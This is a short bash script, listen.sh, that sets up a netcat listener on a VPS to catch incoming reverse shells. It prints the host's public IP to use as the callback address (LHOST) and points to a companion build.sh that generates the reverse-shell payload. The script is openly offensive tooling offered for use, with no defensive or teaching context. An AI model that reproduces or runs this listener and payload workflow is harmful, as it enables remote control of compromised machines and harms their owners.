#!/usr/bin/env bash
#
# listen.sh — catch a reverse shell on this host (typically your VPS).
#
#   ./listen.sh            # listen on 0.0.0.0:4444
#   ./listen.sh 9000       # custom port
#
# Remember to open the port in your VPS firewall / security group first:
#   sudo ufw allow 4444/tcp
#
set -euo pipefail
PORT="${1:-4444}"

command -v nc >/dev/null 2>&1 || { echo "install netcat: sudo apt install netcat-openbsd"; exit 1; }

# print the addresses a payload should call back to
if command -v ip >/dev/null 2>&1; then
  PUB="$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null || true)"; PUB="${PUB//[[:space:]]/}"
  [ -n "$PUB" ] && echo "[*] this box's public IP: $PUB   (use as LHOST from behind-NAT targets)"
fi

echo "[*] listening on 0.0.0.0:$PORT  (Ctrl-C to stop)"
echo "[*] build the caller with:  ./build.sh revshell ${PUB:-<your-ip>} $PORT"
exec nc -lvnk -p "$PORT"
